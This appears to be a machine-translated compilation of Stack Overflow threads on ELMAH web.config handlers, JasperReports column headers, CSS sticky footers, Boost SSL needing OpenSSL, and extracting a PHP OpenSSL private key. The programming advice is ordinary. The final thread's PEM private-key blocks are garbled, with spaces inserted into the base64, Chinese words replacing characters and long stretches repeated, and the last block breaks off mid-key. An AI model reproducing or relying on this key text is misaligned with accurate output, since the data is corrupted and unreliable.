 <location path="admin">
<system.web>
  <httpHandlers>
    <add verb="POST,GET,HEAD" path="elmah.axd" type="Elmah.ErrorLogPageFactory, Elmah" />
  </httpHandlers>
  <authorization>
    <deny users="?"/>
  </authorization>
</system.web> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:56:57.733

您必须将 httphandler 添加到 web.config 的 System.Webserver 部分，以便 IIS 路由它：

```
<system.webServer>   
  <handlers>
    <add verb="POST,GET,HEAD" path="admin/elmah.axd" type="Elmah.ErrorLogPageFactory, Elmah" name="Elmah"/>
  </handlers> 
</system.webServer> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T21:44:55.223

我通过安装 asp.net mvc elmah 控制器解决了这个问题。你可以在[这里](http://www.beletsky.net/2011/08/elmah-mvc-controller-released-on-nuget.html)找到它。

# jasper-reports - JasperReports：标题不在同一行

> ID：11955435
> 
> 赞同：0
> 
> 时间：2012-08-14T15:12:54.637
> 
> 标签：jasper-reports

报告的标题包含 10 个元素，它应该如下所示：

```
|1 2 3 4 5 6 7 8 9 10|
|--------------------| 
```

实际上它看起来像这样：

```
|1 2          8 9 10|
|---3 4 5 6 7 ------| 
```

这与*verticalAligment*有关吗？我已将其设置为底部。

我的 jrxml 文件中的片段：

```
<pageHeader>
    <band height="0"  isSplitAllowed="true" >
    </band>
</pageHeader>
<columnHeader>
    <band height="39"  isSplitAllowed="true" >
        <rectangle>
            <reportElement
                x="0"
                y="1"
                width="780"
                height="30"
                backcolor="#999999"
                key="rectangle-1"/>
            <graphicElement stretchType="NoStretch"/>
        </rectangle>
        <staticText>
            <reportElement
                x="0"
                y="0"
                width="40"
                height="30"
                key="staticText-1"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Holder Id]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="40"
                y="0"
                width="50"
                height="30"
                key="staticText-2"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Shell Id ]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="100"
                y="1"
                width="50"
                height="30"
                key="staticText-3"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Product Id]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="160"
                y="1"
                width="40"
                height="30"
                key="staticText-4"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[SPID]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="200"
                y="1"
                width="40"
                height="30"
                key="staticText-5"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Loc-
ation]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="300"
                y="1"
                width="50"
                height="30"
                key="staticText-6"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Date]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="350"
                y="1"
                width="30"
                height="30"
                key="staticText-7"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Normal Fare]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="380"
                y="1"
                width="30"
                height="30"
                key="staticText-8"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Actual Fare]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="410"
                y="1"
                width="40"
                height="30"
                key="staticText-9"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Currency Code]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="450"
                y="1"
                width="30"
                height="30"
                key="staticText-10"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Staff Id]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="250"
                y="1"
                width="40"
                height="30"
                key="staticText-11"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Dest-
ination]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="750"
                y="0"
                width="30"
                height="30"
                key="staticText-12"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[ISAM Seq.]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="700"
                y="0"
                width="50"
                height="30"
                key="staticText-13"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[ISAM Id]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="670"
                y="0"
                width="30"
                height="30"
                key="staticText-14"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Trans. Type]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="630"
                y="1"
                width="40"
                height="30"
                key="staticText-15"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[CPICC]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="510"
                y="1"
                width="30"
                height="30"
                key="staticText-16"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Conc. Auth]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="480"
                y="1"
                width="30"
                height="30"
                key="staticText-17"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Suppl. Info.]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="540"
                y="1"
                width="40"
                height="30"
                key="staticText-18"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Trans. Seq. No]]></text>
        </staticText>
        <staticText>
            <reportElement
                x="580"
                y="1"
                width="40"
                height="30"
                key="staticText-19"/>
            <box></box>
            <textElement verticalAlignment="Bottom">
                <font size="8"/>
            </textElement>
        <text><![CDATA[Rem. Uses]]></text>
        </staticText>
    </band>
</columnHeader> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T19:35:26.480

如果没有看到您的 JRXML 文件，最好的猜测是以下两种情况之一（或组合）：

*   您没有`Bottom`为字段 1、2、8、9、10 设置垂直对齐方式。
*   您没有为 1、2、8、9、10 设置相同的高度。

除了这两个之外，您没有将`Top`所有元素的顶部设置为相同的值。再一次，这是一个最好的猜测，但无法看到您的 JRXML。如果它不是您需要发布的其中之一，那么我们可以提供帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T14:45:47.860

我已经尝试过拉伸类型、位置类型、浮动等......底部，最高，各种东西，似乎没有任何效果

我所做的是

*   将我周围所有标题 ReportElements 的高度从 39 更改为 20
*   每个高度从 30 到 15
*   增加一些宽度，确保它们足够宽

高度 15 迫使文本保持在一行，没有空间浮动，我觉得这是一种丑陋的修复，我的直觉告诉我这一定不是最好的解决方案，但它有效，我需要完成它今天之前。免费发布答案，如果它有效，我会接受你的答案，而且更优雅。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T09:59:51.127

请参阅 Y 位置。所有标题都不相同。您为 1、2、8、9、10 指定 Y 位置 0，为剩余项目指定 y=1。请确保所有位置都相同。

# html - 如何使用 CSS 正确定位页脚？

> ID：11955440
> 
> 赞同：3
> 
> 时间：2012-08-14T15:13:05.747
> 
> 标签：html, css, footer, sticky-footer

有人可以帮我在网页中正确定位页脚吗？

我有以下布局：

![在此处输入图像描述](../Images/76ab055105360a867f44b47b4f86de39.png)

这就是我希望页脚的行为方式：

*   当内容为空时，页脚应位于页面底部。
*   当内容超过页面高度时，页脚应该被“下推”。

这是我的 HTML：

```
<html>
    <head>
        <title>@ViewBag.Title</title>
    </head>

<body>

/* This is outside of the container as I want the background 
   to stretch across the top of the webpage */
<div id="menu">
    <div>
       /* This contains an unordered list which is restyled as a series of links.
          The reason it is contained in inside the menu div is because I want this
          content to be centred. /*
    </div>
</div>

<div id="page-container">

        <div id="header">
            <h1>Website title</h1>
        </div>

        /* This is floated to the left of the content area. */
        <div id="content">
            @RenderBody()
        </div>

         /* This is floated to the right of the content area. */
        <div id="sidebar">
            @RenderSection("sidebar", false)
        </div>

</div>

<div id="footer">
    My footer content goes here.
</div> 
```

请注意以下事项：

*   内容和标题包含在一个名为“page-container”的“Div”中。
*   内容由浮动在内容区域左右两侧的两个 div 组成。
*   菜单位于页面容器 div 之外。这是因为我希望菜单背景延伸到页面顶部（如 Stackoverflow 菜单）

我知道 Stackoverflow 上有很多类似的问题，而且 Google 搜索会返回大量结果。

我在尝试调整我发现的样本时注意到的一点是，它们通常依赖于与我的不匹配的非常特定的 html 结构（例如，除了页脚之外的所有内容都在容器中）。无论我尝试什么，我都会得到一些不起作用的东西（例如，当内容为空时，页脚位于屏幕边界下方，或者当内容超出页面时不会向下移动）。

**更新**

我可以让页脚贴在页面底部，但当我的内容展开时它不会被下推。我认为这是因为我的内容是由两个浮动元素组成的。

大多数人似乎将我指向他们在 Google 上找到的教程（如前所述，我已经阅读了其中的大部分内容并且已经尝试对其进行改编）。

我得出的结论是，我将不得不重组我的 HTML 以使其正常工作；我的问题的重点是如何使用我已经拥有的 HTML 来做到这一点？关注点分离就这么多！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:26:10.427

一个快速的谷歌搜索给了我一些你会发现有用的链接。

[http://www.cssstickyfooter.com/](http://www.cssstickyfooter.com/)

[http://ryanfait.com/resources/footer-stick-to-bottom-of-page/](http://ryanfait.com/resources/footer-stick-to-bottom-of-page/)

我会坚持第一个，但要么应该做你想做的事。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T15:29:38.573

我做了一个小提琴： http: [//jsfiddle.net/karlroos/ZVkYC/](http://jsfiddle.net/karlroos/ZVkYC/)（对不起，组织不好的CSS）

看一看。您必须为`min-height: 100%;`旧版本的 IE 做一些解决方法，大概是使用 JavaScript。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:16:01.513

将您的`div`-s 包装在包装器中：

```
#wrapper {
  width:100%;
  height:500px;
  background:#ccc;
  margin:auto;
  position:relative;
} 
```

并为您的页脚使用以下 CSS：

```
#footer {
   width: 100%;
   height: 80px;
   background-color: #ccc;
   position:absolute;
   bottom: 0;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:19:57.570

您是否尝试过将 body 设置为 with`position:relative`并将页脚设置为`position:absolute`with `bottom:0`？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-14T15:25:45.973

尝试编辑您的 CSS 以包含以下内容：

```
#footer {
width: 710px;
height: 50px;
margin: 0 auto;
padding: 40px 0 0 0;
}

#footer p {
margin: 0;
text-align: center;
font-size: 77%;
}

#footer a {
text-decoration: underline;
}

#footer a:hover {
text-decoration: none;
} 
```

然后在页脚中调用它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-14T19:24:15.933

正如我在帖子的编辑中提到的，我最终不得不稍微改变我的 HTML：

```
<body>
    <div id="page-container" >
        <div id="menu">
            <div>

            </div>
        </div>

        <div id="layout-container">

            <div id="header">
                <h1>Website title</h1>
            </div>

            <div id="content">
                @RenderBody()
            </div>

            <div id="sidebar">
                @RenderSection("sidebar", false)
            </div>

        </div>
    </div>

<div id="footer">

</div> 
```

我的 CSS 是基于[这里](http://www.cssstickyfooter.com/)找到的 CSS （这个相同的链接是由几个人发布的，但我已经在使用它了！）

该解决方案的效率约为 99%。当内容区域为空时，我的页脚会粘在页面底部，并且当内容变得比屏幕大时也会被向下推，但我现在有一个永久滚动条，因为我的页面高度似乎已关闭（移动鼠标滚轮滚动页面上下移动一个像素）。

到目前为止，我一直无法摆脱这个问题，所以我不情愿地接受这是一个完整的解决方案，除非其他人能指出我正确的方向。

**更新**

似乎 1 像素偏移是由我的页脚顶部边框为 1 像素引起的。我只是调整了我的 CSS 来解决这个问题，当内容没有完全填满屏幕时，滚动条就会消失。

```
#footer {
    margin-top: -151px;
    height: 150px;
} 
```

# c++ - Boost SSL 编译失败

> ID：11955443
> 
> 赞同：4
> 
> 时间：2012-08-14T15:13:18.253
> 
> 标签：c++, boost, ssl

我想用

```
#include <boost/asio/ssl.hpp> 
```

但它曾经让我失望：

```
1>d:\boost\boost\asio\ssl\detail\openssl_types.hpp(19) : fatal error C1083: Cannot open include file: 'openssl/conf.h': No such file or directory 
```

它出什么问题了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-14T15:22:28.903

`boost::asio::ssl`需要`OpenSSL`.

[http://www.boost.org/doc/libs/1_50_0/doc/html/boost_asio/overview/ssl.html](http://www.boost.org/doc/libs/1_50_0/doc/html/boost_asio/overview/ssl.html)

**使用 Boost.Asio 的 SSL 支持需要 OpenSSL。**

检查`boost::asio`库的配置和`openssl`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-14T15:21:23.467

您还需要安装 OpenSSL [http://www.openssl.org/source/](http://www.openssl.org/source/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-04T00:58:10.407

你需要 OpenSSL。

请点击此链接：[https ://slproweb.com/products/Win32OpenSSL.html](https://slproweb.com/products/Win32OpenSSL.html)

您有一个 Windows 上 Openssl 的自动安装程序列表！

选择“Win32 OpenSSL v1.0.2d”。将其安装到您的系统并将所需的库路径添加到您的项目配置中。

重新编译一切，它会工作。

（要添加的路径是：XXXX/OpenSSL-Win32\include 和 XXXX/OpenSSL-Win32\lib）

# php - 从 openssl_pkey_get_private() 检索原始私钥

> ID：11955446
> 
> 赞同：3
> 
> 时间：2012-08-14T15:13:37.743
> 
> 标签：php, openssl, key, private, encryption

我已经花了很长时间试图弄清楚如何使用密码从 openssl_pkey_get_private() 中准确检索原始私钥数据。我觉得我缺少一件简单的事情。

这是我的代码：

```
$config = array(
    "private_key_bits" => 2048, //size of private key
)

$privKey = openssl_pkey_new($config); //creating a private key resource
openssl_pkey_export($privKey, $pkeyout,"test123",$config); //obtaining an encrypted private key
$result = openssl_pkey_get_private($pkeyout, "test123"); //decrypting the encrypted private key
var_dump($result); //print results 
```

不幸的是，我从 var_dump() 调用中得到的只是以下输出：“ **resource(2) of type (OpenSSL key)** ”

* * *

因此，几乎在我调用 openssl_pkey_export 之后，$pkeyout 包含类似以下内容 - 考虑以下数据，即我希望 openssl_pkey_get_private 执行的解密过程的**INPUT ：**

> > -----开始 RSA 私钥-----
> > 
> > Proc-Type：4，**加密**DEK-信息：DES-EDE3-CBC，84AC553B6367CD10 BOVayTi4R9IZX0V1 /如lbX / YG16v87vQ1AX5apgcPEwOaJDRBUB07iiJwkSEOckR3w YW / 2E27YXhJGaVjSMiBbBycu9AHQIgNhggUCXvzr6AMhDYNAu787c0EUsA7Ax4Yw Gixk9qX / iECcjVXqdoz2 + pSrRUUB5l3T + JyRh8sgKkdcM74dEQ5UDTrMd1Ik26 + N 4Ms8iA9SS9J1FdTBswx119 + WTcybSCBsX0tWPkjf7SARzgL9ee02B61Mua2PypZy RO4UIRGeQy / 0O / ySdUg1L42sTmmwY7odWnwbbYsIgFsSaijDGx14VohgnRbEZK ++ 6Ix0w1ZYSzsKWiZEEuXXC6EvOIv6zOiUmJRW / 0jGjuDIbz0MTtYgU / A99fK97EYo / xWNIm / kfs2gM4ccNVzE / fiVIZg + FVTpkriXPVUhjLUZVoB9vLLZd7RrC55p4tX / 22pgh0RULF2i + wQn6NgeP29naa + 3S1UyfN1USDfFyuZTWuctlK + C6R / yAefsat5X VvwIjdp + wjIbMUV7UmsPlc85O71bq3RjMVfJF / LLc9cOQCFOYacXD8IsYMJqngPz IbO5xBzCDFZuXcM6xvu1UWeGbNz2yG / kC2hiHSS1oMrA6S3JiHTmVSwzOUx5qMXl bYFz19Qqs / qAXj8G4PV5a0VN5m5hy1yAUHsau6oUl750PU5gHlMsFvF2LMAjtrAC VYvtqoLsyc5HBW7eOSa / vCeHuOKnpUvWF / CuthZYX0Uq58pcBbL4CfKRk1yUohRiutKILoMFRsNvKB4iLpMocxvps1clfgIHdPK9c0b6WaFaDjy3ZkCaVjTslosQCjUV DztkGRbCxqPu0M5erqPciO1JxGYCK5 + U5G / FpChqwhwHQSSYxwUV9InZsc59Ogm / qFIDRaJQMEeMi9oP4K5h4L8puvLpoJFAe5Y8GjGIqs7VLj96bjsyc7kyaWkaP4FZ aaDbP + nTqtPxSV4pLX + MGfrr / lZfULutPdXnu / Av3pt92dg7alPme56uzKfs / +我们WIeSyQpvPHcUmnGJZABPagbehpiTe6T9LQ + wCgteZSRCRiEdTgwuKtklB3kC1Hvv GpFS2XGmguKa8qLZU4s1IWILeTcFqbcPLCevwSuy123D6CL4U2lT85Pv8ZHCOqND qvfloF8nVNwyM5NiAbIcxCYxNA8TfCQ6P9Rn4C83r / MYyiUc1ArtKSVgLDluDli9 A3F807Ont42CWCL4sr2aPjxzWUkRBteUUkLdvryYsg804NdD8oPGL5VEAdC435PR奥米德+ ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZDztkGRbCxqPu0M5erqPciO1JxGYCK5 + U5G / FpChqwhwHQSSYxwUV9InZsc59Ogm / qFIDRaJQMEeMi9oP4K5h4L8puvLpoJFAe5Y8GjGIqs7VLj96bjsyc7kyaWkaP4FZ aaDbP + nTqtPxSV4pLX + MGfrr / lZfULutPdXnu / Av3pt92dg7alPme56uzKfs / +我们WIeSyQpvPHcUmnGJZABPagbehpiTe6T9LQ + wCgteZSRCRiEdTgwuKtklB3kC1Hvv GpFS2XGmguKa8qLZU4s1IWILeTcFqbcPLCevwSuy123D6CL4U2lT85Pv8ZHCOqND qvfloF8nVNwyM5NiAbIcxCYxNA8TfCQ6P9Rn4C83r / MYyiUc1ArtKSVgLDluDli9 A3F807Ont42CWCL4sr2aPjxzWUkRBteUUkLdvryYsg804NdD8oPGL5VEAdC435PR奥米德+ ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZDztkGRbCxqPu0M5erqPciO1JxGYCK5 + U5G / FpChqwhwHQSSYxwUV9InZsc59Ogm / qFIDRaJQMEeMi9oP4K5h4L8puvLpoJFAe5Y8GjGIqs7VLj96bjsyc7kyaWkaP4FZ aaDbP + nTqtPxSV4pLX + MGfrr / lZfULutPdXnu / Av3pt92dg7alPme56uzKfs / +我们WIeSyQpvPHcUmnGJZABPagbehpiTe6T9LQ + wCgteZSRCRiEdTgwuKtklB3kC1Hvv GpFS2XGmguKa8qLZU4s1IWILeTcFqbcPLCevwSuy123D6CL4U2lT85Pv8ZHCOqND qvfloF8nVNwyM5NiAbIcxCYxNA8TfCQ6P9Rn4C83r / MYyiUc1ArtKSVgLDluDli9 A3F807Ont42CWCL4sr2aPjxzWUkRBteUUkLdvryYsg804NdD8oPGL5VEAdC435PR奥米德+ ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZqFIDRaJQMEeMi9oP4K5h4L8puvLpoJFAe5Y8GjGIqs7VLj96bjsyc7kyaWkaP4FZ aaDbP + nTqtPxSV4pLX + MGfrr / lZfULutPdXnu / Av3pt92dg7alPme56uzKfs / +我们WIeSyQpvPHcUmnGJZABPagbehpiTe6T9LQ + wCgteZSRCRiEdTgwuKtklB3kC1Hvv GpFS2XGmguKa8qLZU4s1IWILeTcFqbcPLCevwSuy123D6CL4U2lT85Pv8ZHCOqND qvfloF8nVNwyM5NiAbIcxCYxNA8TfCQ6P9Rn4C83r / MYyiUc1ArtKSVgLDluDli9 A3F807Ont42CWCL4sr2aPjxzWUkRBteUUkLdvryYsg804NdD8oPGL5VEAdC435PR奥米德+ ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZqFIDRaJQMEeMi9oP4K5h4L8puvLpoJFAe5Y8GjGIqs7VLj96bjsyc7kyaWkaP4FZ aaDbP + nTqtPxSV4pLX + MGfrr / lZfULutPdXnu / Av3pt92dg7alPme56uzKfs / +我们WIeSyQpvPHcUmnGJZABPagbehpiTe6T9LQ + wCgteZSRCRiEdTgwuKtklB3kC1Hvv GpFS2XGmguKa8qLZU4s1IWILeTcFqbcPLCevwSuy123D6CL4U2lT85Pv8ZHCOqND qvfloF8nVNwyM5NiAbIcxCYxNA8TfCQ6P9Rn4C83r / MYyiUc1ArtKSVgLDluDli9 A3F807Ont42CWCL4sr2aPjxzWUkRBteUUkLdvryYsg804NdD8oPGL5VEAdC435PR奥米德+ ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZWIeSyQpvPHcUmnGJZABPagbehpiTe6T9LQ + wCgteZSRCRiEdTgwuKtklB3kC1Hvv GpFS2XGmguKa8qLZU4s1IWILeTcFqbcPLCevwSuy123D6CL4U2lT85Pv8ZHCOqND qvfloF8nVNwyM5NiAbIcxCYxNA8TfCQ6P9Rn4C83r / MYyiUc1ArtKSVgLDluDli9 A3F807Ont42CWCL4sr2aPjxzWUkRBteUUkLdvryYsg804NdD8oPGL5VEAdC435PR OMID + ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZWIeSyQpvPHcUmnGJZABPagbehpiTe6T9LQ + wCgteZSRCRiEdTgwuKtklB3kC1Hvv GpFS2XGmguKa8qLZU4s1IWILeTcFqbcPLCevwSuy123D6CL4U2lT85Pv8ZHCOqND qvfloF8nVNwyM5NiAbIcxCYxNA8TfCQ6P9Rn4C83r / MYyiUc1ArtKSVgLDluDli9 A3F807Ont42CWCL4sr2aPjxzWUkRBteUUkLdvryYsg804NdD8oPGL5VEAdC435PR OMID + ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZOMID + ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZOMID + ESmayXreMVCXWwLwTQS1M3yi96wTaSlSWHtSFmzXFI5tmzEDa52 / 5Pl6ksx tcI9dKbHUOj42ZrtWYZhR + K8XwrxEg8u4kkQv2U13bySBihx / WSuZURXSjULyI2h nd8wQddVPFGodxd8CTT / 3gPP97oDC16i3YNj7apKJXrjXl8HvZIyE3yAHnf39dAG JWbC1roUcQfQs0AUrxlAe75Sh9zoV4FKpq4A7JM31zklVjJw3rqjxBmNIBUow586 4WPFsIgGJQ0Gp3PfoO4sl / BuIxVjhe31yYAaeK + jA5K48PCPgirE / NCK / 08cxZdZ
> > 
> > > -----结束 RSA 私钥---

**我真正想要的是原始的解密私钥**（openssl_pkey_get_private（）的假定**输出**。请注意，上面是加密的**（如“-----BEGIN RSA PRIVATE KEY-- ---")。

这看起来类似于以下内容（请注意，下面的数据没有标头表明它已像上面的数据那样加密）。

> > -----开始 RSA 私钥-----
> > 
> > MIIEowIBAAKCAQEAzuhc4J08EiayUSpIQ9MG6FM5JwYm1d0UIaAZ9h2QV4r897Oo GxvxaQ / ceIY7Sdrpc6kWAF + cemKfA84WX6T + LgiimfZnSIDhF1xHFk2Yluc8cyqq gKswgewZi01dVz4nP +1瓦特/ kPUNvZCQr4zxlimp2RiJZEH1wS5ls41iOUqYufz7d2h / 559eE2 / Uh2QQo + LhZt30DtHfLJmjHrxwL6aNFNVKw1iZsEzp36U1iLlrj / + TVjr JlVju9mqeK / Y + eYtWNUVHCCcbhWKO + dJVy0 + baRc8LhK6ogTj7ZYrriBFx6Y3sXY xEwTlvoLITZKvxFX4MH21fg7KSJN4 / JawG4hDQIDAQABAoIBAH5RuFpdRE5kl5sb 8FCQJnhyTsM3a0BIH8FDqHXsqLH5peVoJqqeTa1xxI1Eji / R2ZMGWOtTdAn36dL9 4AT2i0P5e6P5nibSoBmN + cxxBUaj1 / ELzFqPqSa4yQOV8PWReY763HAvYwFHKT7s NlnSx7QMgisjNyEbvl6GeIKiPlVw5CLp + SKDA4TkxyJfHJN9 / En8Pgzx / SOBznYo shXQGCF3cuoW5Hblxl10Vcy + 36SewjDMJKD0AYSEDI2znWEXPV567r80DvMazOug bbzWIk8lLiOhsUBCY8MdHRT9HxQs5tol6Xf84vM / wRX210USTfSo9IRuZxVYb + ED + qdthXUCgYEA5utux38mCEp7iroM8f4lZy8IU3zSuVOzUYJ0l1eYax0YNf7zWaAn rdYf1J3vZIXsfPkuup0jc6WJJ4h8aMlVroiY4Ekjh1rd1iM4x5gEM52knt0jIFTRs5zUYc4aHNEHLYCSxHgBkDQbqlzF2SvEhF1 / F9E8n9DCbl2X + MqqZSMCgYEA5WFK 6g8rZ01CmmiC + WzuW0lVWpaNIi4luKsA6B2fiIjY4Xh46qkddYuwVUxLM3xym7Yo eoFfUu4kiTKGJdTMAkReIn + tqPTg9LwvvHSNH2GMp8 / TjmxbQd + x9QVyGKNnTsLY aYrbcK7rh9fbvZsywNLeYrrt / VrmArpt2FMqPA8CgYBTm / D7WKU7oUREAYNIZ13B k3zvRaXCpnSp0ZNHbNbqCZnHiy0vSVa0kW / Q + TG / zGHJCiwKM3UvnUMgxkFNa4CT的di / sHW84xgTGUPBxDDCRQ8XkI2thfHSFFQas9wPrZR + 1MPVzH4RpYwSVVYvpSviX eIbY59CMiPitH0Q0N6UkgwKBgQCktsHJ48zCKGu8X3I11DAxYy6kl1mPgt3Zhwpm O + cMb2B2QEFsGLar0vxztA6IUUQnZp4YolAmSBX6Y0qLXgyFUDzcvxygKABmHcCV rogsUatkUcvUCSFa41xx21A8OxKTLz2iRHEhsKo3aR1FQW4nowTIlv0RIrXqnZ8F 